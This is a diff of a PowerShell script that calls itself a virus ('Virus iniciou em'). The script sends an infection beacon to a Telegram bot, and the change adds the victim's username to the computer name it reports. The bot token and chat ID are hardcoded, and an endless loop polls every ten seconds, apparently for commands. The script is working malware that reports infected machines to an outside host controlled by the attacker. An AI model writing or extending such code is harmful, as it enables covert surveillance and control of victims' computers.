@@ -20,10 +20,11 @@ function ObterNumeroAposHash {
 }
 
 $ComputerName = $env:COMPUTERNAME
+$UserName = $env:USERNAME
 $token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
 $chatId = "5757392163"
 
-$msg = "Virus iniciou em $ComputerName"
+$msg = "Virus iniciou em $ComputerName - $UserName"
     Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
         -Method Post `
         -ContentType "application/json" `
@@ -47,5 +48,6 @@ while ($true) {
         }
     Start-Sleep -Seconds 10
 }
+
 
 
